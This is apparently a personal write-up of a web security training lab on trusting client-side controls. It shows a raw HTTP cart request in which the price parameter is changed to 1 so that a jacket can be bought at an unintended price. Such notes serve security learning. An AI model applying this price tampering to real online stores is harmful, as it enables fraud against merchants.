# Lab: Excessive trust in client-side controls

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter

## Business Logic vulnerabilities
* 題目說要買指定的商品，改一下價格就可以買了
```
POST /cart HTTP/1.1
Host: ace91f121e9af65dc0741cda0090006c.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5 (Ergänzendes Update)) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: https://ace91f121e9af65dc0741cda0090006c.web-security-academy.net
Connection: close
Referer: https://ace91f121e9af65dc0741cda0090006c.web-security-academy.net/product?productId=1
Cookie: session=I5SrOQJP5I724aKlnwFloDGdcmgS9S5g
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
X-Forwarded-For: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache

productId=1&redir=PRODUCT&quantity=1&price=1
```